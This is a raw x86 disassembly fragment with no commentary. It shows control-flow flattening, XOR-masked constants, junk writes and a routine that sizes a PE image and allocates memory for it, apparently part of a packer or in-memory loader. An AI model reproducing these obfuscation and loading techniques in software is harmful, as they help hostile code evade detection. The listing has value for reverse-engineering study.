  428e67:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e6e:	or     al,cl
  428e70:	mov    ecx,DWORD PTR [ebp-0xc]
  428e73:	mov    ecx,DWORD PTR [ecx]
  428e75:	xor    ecx,edi
  428e77:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428e7e:	cmp    cl,al
  428e80:	jne    0x428f5a
  428e86:	mov    eax,DWORD PTR [ebp+0xc]
  428e89:	mov    eax,DWORD PTR [eax]
  428e8b:	xor    eax,edi
  428e8d:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e94:	mov    ecx,DWORD PTR [ebp-0x10]
  428e97:	mov    ecx,DWORD PTR [ecx]
  428e99:	xor    ecx,edi
  428e9b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ea2:	xor    al,cl
  428ea4:	mov    ecx,DWORD PTR [ebp-0x14]
  428ea7:	mov    ecx,DWORD PTR [ecx]
  428ea9:	xor    ecx,edi
  428eab:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428eb2:	or     al,cl
  428eb4:	mov    ecx,DWORD PTR [ebp-0x10]
  428eb7:	mov    ecx,DWORD PTR [ecx]
  428eb9:	xor    ecx,edi
  428ebb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428ec2:	cmp    cl,al
  428ec4:	jne    0x428f5a
  428eca:	mov    eax,DWORD PTR [ebp-0x14]
  428ecd:	mov    eax,DWORD PTR [eax]
  428ecf:	xor    eax,edi
  428ed1:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428ed8:	mov    ecx,DWORD PTR [ebp+0xc]
  428edb:	mov    ecx,DWORD PTR [ecx]
  428edd:	xor    ecx,edi
  428edf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ee6:	xor    al,cl
  428ee8:	mov    ecx,DWORD PTR [ebp-0xc]
  428eeb:	mov    ecx,DWORD PTR [ecx]
  428eed:	xor    ecx,edi
  428eef:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ef6:	or     al,cl
  428ef8:	mov    ecx,DWORD PTR [ebp+0xc]
  428efb:	mov    ecx,DWORD PTR [ecx]
  428efd:	xor    ecx,edi
  428eff:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428f06:	cmp    cl,al
  428f08:	jne    0x428f5a
  428f0a:	mov    eax,DWORD PTR [ebp-0x14]
  428f0d:	mov    eax,DWORD PTR [eax]
  428f0f:	xor    eax,edi
  428f11:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428f18:	mov    ecx,DWORD PTR [ebp-0xc]
  428f1b:	mov    ecx,DWORD PTR [ecx]
  428f1d:	xor    ecx,edi
  428f1f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f26:	xor    al,cl
  428f28:	mov    ecx,DWORD PTR [ebp-0x10]
  428f2b:	mov    ecx,DWORD PTR [ecx]
  428f2d:	xor    ecx,edi
  428f2f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f36:	or     al,cl
  428f38:	mov    ecx,DWORD PTR [ebp-0x14]
  428f3b:	mov    ecx,DWORD PTR [ecx]
  428f3d:	xor    ecx,edi
  428f3f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428f46:	cmp    cl,al
  428f48:	jne    0x428f5a
  428f4a:	lea    eax,[ebp-0x4c]
  428f4d:	push   eax
  428f4e:	call   0x428a15
  428f53:	mov    ecx,DWORD PTR [ebp-0x44]
  428f56:	cmp    eax,ecx
  428f58:	je     0x428f64
  428f5a:	mov    eax,DWORD PTR [ebp+0x8]
  428f5d:	xor    eax,edi
  428f5f:	add    eax,ebx
  428f61:	mov    DWORD PTR [ebp+0x18],eax
  428f64:	mov    eax,DWORD PTR [ebp-0x8]
  428f67:	xor    eax,edi
  428f69:	lea    eax,[eax+esi*1+0x3272f5]
  428f70:	xor    eax,edi
  428f72:	mov    ecx,DWORD PTR [ebp+0x8]
  428f75:	mov    edx,DWORD PTR [ebp+0x18]
  428f78:	xor    ecx,edi
  428f7a:	add    ecx,ebx
  428f7c:	cmp    edx,ecx
  428f7e:	je     0x428d7b
  428f84:	mov    eax,DWORD PTR [ebp+0x8]
  428f87:	mov    ecx,DWORD PTR [ebp+0x18]
  428f8a:	xor    eax,edi
  428f8c:	add    eax,ebx
  428f8e:	cmp    ecx,eax
  428f90:	jne    0x428fa3
  428f92:	mov    eax,DWORD PTR [ebp-0x8]
  428f95:	mov    ecx,DWORD PTR [ebp+0x1c]
  428f98:	xor    eax,edi
  428f9a:	lea    eax,[eax+ecx*1+0x3272f5]
  428fa1:	jmp    0x42901a
  428fa3:	push   0x18
  428fa5:	push   DWORD PTR [ebp-0x4]
  428fa8:	lea    eax,[ebp-0x64]
  428fab:	push   eax
  428fac:	call   0x42828f
  428fb1:	mov    eax,DWORD PTR [ebp+0x8]
  428fb4:	mov    ecx,DWORD PTR [ebp-0x18]
  428fb7:	xor    eax,edi
  428fb9:	add    eax,ebx
  428fbb:	cmp    eax,ecx
  428fbd:	je     0x428fd2
  428fbf:	mov    eax,DWORD PTR [ebp+0x8]
  428fc2:	xor    eax,edi
  428fc4:	add    eax,ebx
  428fc6:	push   eax
  428fc7:	push   0x18
  428fc9:	lea    eax,[ebp-0x64]
  428fcc:	push   eax
  428fcd:	call   0x428875
  428fd2:	mov    eax,DWORD PTR [ebp-0x4]
  428fd5:	add    eax,0x18
  428fd8:	mov    DWORD PTR [ebp+0x18],eax
  428fdb:	push   DWORD PTR [ebp-0x50]
  428fde:	push   DWORD PTR [ebp+0x18]
  428fe1:	mov    eax,DWORD PTR [ebp-0x54]
  428fe4:	add    eax,DWORD PTR [ebp-0x20]
  428fe7:	push   eax
  428fe8:	call   0x42828f
  428fed:	mov    eax,DWORD PTR [ebp+0x8]
  428ff0:	mov    ecx,DWORD PTR [ebp-0x18]
  428ff3:	xor    eax,edi
  428ff5:	add    eax,ebx
  428ff7:	cmp    eax,ecx
  428ff9:	je     0x42900c
  428ffb:	push   0x0
  428ffd:	push   DWORD PTR [ebp-0x50]
  429000:	mov    eax,DWORD PTR [ebp-0x54]
  429003:	add    eax,DWORD PTR [ebp-0x20]
  429006:	push   eax
  429007:	call   0x428875
  42900c:	mov    eax,DWORD PTR [ebp-0x24]
  42900f:	mov    ecx,DWORD PTR [ebp-0x50]
  429012:	add    DWORD PTR [eax],ecx
  429014:	mov    eax,DWORD PTR [ebp-0x50]
  429017:	add    eax,DWORD PTR [ebp+0x1c]
  42901a:	mov    DWORD PTR [ebp+0x1c],eax
  42901d:	mov    eax,DWORD PTR [ebp-0x8]
  429020:	mov    ecx,DWORD PTR [ebp+0x1c]
  429023:	xor    eax,edi
  429025:	add    eax,ebx
  429027:	imul   eax,ecx
  42902a:	mov    ecx,DWORD PTR [ebp+0x8]
  42902d:	mov    edx,DWORD PTR [ebp-0x28]
  429030:	xor    ecx,edi
  429032:	lea    ecx,[ecx+edx*1+0x3272f5]
  429039:	cmp    eax,ecx
  42903b:	jb     0x428c99
  429041:	mov    esi,DWORD PTR [ebp+0x14]
  429044:	mov    eax,DWORD PTR [ebp-0x20]
  429047:	mov    DWORD PTR [esi],eax
  429049:	jmp    0x429090
  42904b:	mov    ecx,DWORD PTR [ebp+0x8]
  42904e:	mov    edx,DWORD PTR [ebp+0xc]
  429051:	xor    ecx,edi
  429053:	xor    edx,edi
  429055:	add    ecx,ebx
  429057:	add    edx,ebx
  429059:	cmp    ecx,edx
  42905b:	jne    0x42906f
  42905d:	mov    eax,ds:0x7f642ddc
  429062:	imul   eax,eax,0x9f15fccf
  429068:	mov    ds:0x7f642ddc,eax
  42906d:	jmp    0x429090
  42906f:	mov    ecx,DWORD PTR [ebp+0x8]
  429072:	xor    ecx,edi
  429074:	add    ecx,ebx
  429076:	cmp    eax,ecx
  429078:	je     0x429086
  42907a:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  429084:	jmp    0x429090
  429086:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  429090:	pop    edi
  429091:	pop    esi
  429092:	pop    ebx
  429093:	leave  
  429094:	ret    0x18
  429097:	push   ebp
  429098:	mov    ebp,esp
  42909a:	and    esp,0xfffffff8
  42909d:	mov    eax,DWORD PTR [ebp+0x20]
  4290a0:	sub    esp,0x14
  4290a3:	push   ebx
  4290a4:	mov    ebx,DWORD PTR [ebp+0x14]
  4290a7:	push   esi
  4290a8:	push   edi
  4290a9:	cmp    eax,0xf89c85a5
  4290ae:	jne    0x4290ba
  4290b0:	push   0xf89c85a2
  4290b5:	jmp    0x4291ec
  4290ba:	mov    eax,DWORD PTR [ebp+0x20]
  4290bd:	cmp    eax,0xf89c85a2
  4290c2:	jne    0x4290ce
  4290c4:	push   0xf89c85a3
  4290c9:	jmp    0x4291ec
  4290ce:	mov    eax,DWORD PTR [ebp+0x20]
  4290d1:	cmp    eax,0xf89c85a3
  4290d6:	jne    0x4290e2
  4290d8:	push   0xf89c85a0
  4290dd:	jmp    0x4291ec
  4290e2:	mov    eax,DWORD PTR [ebp+0x20]
  4290e5:	cmp    eax,0xf89c85a0
  4290ea:	jne    0x4290f6
  4290ec:	push   0xf89c85a1
  4290f1:	jmp    0x4291ec
  4290f6:	mov    ecx,DWORD PTR [ebp+0x20]
  4290f9:	mov    eax,0xf89c85bc
  4290fe:	cmp    ecx,eax
  429100:	jne    0x4291bc
  429106:	mov    eax,DWORD PTR [ebp+0x10]
  429109:	mov    DWORD PTR [esp+0xc],eax
  42910d:	mov    eax,DWORD PTR [ebp+0x18]
  429110:	mov    DWORD PTR [esp+0x14],eax
  429114:	mov    eax,DWORD PTR [ebp+0xc]
  429117:	mov    DWORD PTR [esp+0x18],eax
  42911b:	mov    eax,DWORD PTR [ebp+0x8]
  42911e:	mov    DWORD PTR [esp+0x10],eax
  429122:	mov    eax,DWORD PTR [esp+0x10]
  429126:	mov    ecx,DWORD PTR [esp+0x14]
  42912a:	mov    edi,0x75108ae
  42912f:	xor    eax,edi
  429131:	mov    esi,0x3272f5
  429136:	add    eax,esi
  429138:	mov    DWORD PTR [ecx],eax
  42913a:	mov    eax,DWORD PTR [esp+0xc]
  42913e:	mov    eax,DWORD PTR [eax+0x194]
  429144:	mov    ecx,DWORD PTR [eax]
  429146:	mov    eax,DWORD PTR [esp+0xc]
  42914a:	mov    eax,DWORD PTR [eax+0x194]
  429150:	mov    eax,DWORD PTR [eax]
  429152:	add    eax,DWORD PTR [ecx+0x3c]
  429155:	mov    ecx,DWORD PTR [esp+0xc]
  429159:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42915f:	mov    ecx,DWORD PTR [ecx+0x14]
  429162:	push   0x4
  429164:	push   0x3000
  429169:	push   DWORD PTR [eax+0x50]
  42916c:	push   0x0
  42916e:	call   ecx
  429170:	mov    DWORD PTR [ebx],eax
  429172:	mov    eax,DWORD PTR [esp+0x10]
  429176:	push   DWORD PTR [esp+0xc]
  42917a:	xor    eax,edi
  42917c:	add    eax,esi
  42917e:	mov    DWORD PTR [esp+0x20],eax
  429182:	lea    eax,[esp+0x20]
  429186:	push   eax
  429187:	push   ebx
  429188:	push   DWORD PTR [esp+0x20]
  42918c:	push   DWORD PTR [esp+0x28]
  429190:	push   DWORD PTR [esp+0x24]
  429194:	call   0x428b59
  429199:	mov    eax,DWORD PTR [esp+0x10]
  42919d:	mov    ecx,DWORD PTR [ebx]
  42919f:	xor    eax,edi
  4291a1:	add    eax,esi
  4291a3:	cmp    ecx,eax
  4291a5:	je     0x429203
  4291a7:	mov    eax,DWORD PTR [esp+0x18]
  4291ab:	mov    ecx,DWORD PTR [esp+0x14]
  4291af:	xor    eax,edi
  4291b1:	add    eax,esi
  4291b3:	imul   eax,DWORD PTR [esp+0x1c]
  4291b8:	mov    DWORD PTR [ecx],eax
  4291ba:	jmp    0x429203
  4291bc:	mov    ecx,DWORD PTR [ebp+0x20]
  4291bf:	cmp    ecx,0xf89c85a1
  4291c5:	jne    0x4291ce
  4291c7:	push   0xf89c85be
  4291cc:	jmp    0x4291ec
  4291ce:	mov    ecx,DWORD PTR [ebp+0x20]
  4291d1:	cmp    ecx,0xf89c85be
  4291d7:	jne    0x4291e0
  4291d9:	push   0xf89c85bf
  4291de:	jmp    0x4291ec
  4291e0:	mov    ecx,DWORD PTR [ebp+0x20]
  4291e3:	cmp    ecx,0xf89c85bf
  4291e9:	jne    0x429203
  4291eb:	push   eax
  4291ec:	push   DWORD PTR [ebp+0x1c]
  4291ef:	push   DWORD PTR [ebp+0x18]
  4291f2:	push   ebx
  4291f3:	push   DWORD PTR [ebp+0x10]
  4291f6:	push   DWORD PTR [ebp+0xc]
  4291f9:	push   DWORD PTR [ebp+0x8]
  4291fc:	call   0x429097
  429201:	mov    DWORD PTR [ebx],eax
  429203:	mov    eax,DWORD PTR [ebx]
  429205:	pop    edi
  429206:	pop    esi
  429207:	pop    ebx
  429208:	mov    esp,ebp
  42920a:	pop    ebp
  42920b:	ret    0x1c
  42920e:	push   ebp
  42920f:	mov    ebp,esp
  429211:	sub    esp,0xc
  429214:	mov    eax,0xf89c85a5
  429219:	mov    DWORD PTR [ebp-0x8],eax
  42921c:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  429223:	mov    ecx,DWORD PTR [ebp-0x8]
  429226:	xor    ecx,0x75108ae
  42922c:	add    ecx,0x3272f5
  429232:	mov    DWORD PTR [ebp-0x4],ecx
  429235:	mov    ecx,DWORD PTR [ebp+0xc]
  429238:	push   eax
  429239:	mov    DWORD PTR [ebp+0xc],ecx
  42923c:	push   DWORD PTR [ebp+0xc]
  42923f:	lea    eax,[ebp-0x4]
  429242:	push   DWORD PTR [ebp+0x8]
  429245:	push   eax
  429246:	push   DWORD PTR [ebp+0xc]
  429249:	push   DWORD PTR [ebp-0xc]
  42924c:	push   DWORD PTR [ebp-0x8]
  42924f:	call   0x429097
  429254:	mov    DWORD PTR [ebp-0x4],eax
  429257:	mov    eax,DWORD PTR [ebp-0x4]
  42925a:	leave  
  42925b:	ret    0x8
